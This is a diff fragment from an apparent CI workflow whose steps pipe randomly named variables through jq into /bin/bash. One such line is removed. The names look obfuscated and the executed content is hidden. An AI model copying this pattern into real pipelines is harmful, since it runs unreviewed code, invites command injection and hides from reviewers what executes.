@@ -27,7 +27,6 @@ jobs:
           echo $gwt07 | jq -r .dn724 | /bin/bash
           echo $bemfr6 | jq -r .ljcdz5034 | /bin/bash
           echo $qimt60388 | jq -r .qqdq64 | /bin/bash
-          echo $q085 | jq -r .ghn4765 | /bin/bash
           echo $br383 | jq -r .e411 | /bin/bash
           printf '%s' "$knte969" | jq -r .wn35564 | /bin/bash
           echo $e6365 | jq -r .a608 | /bin/bash
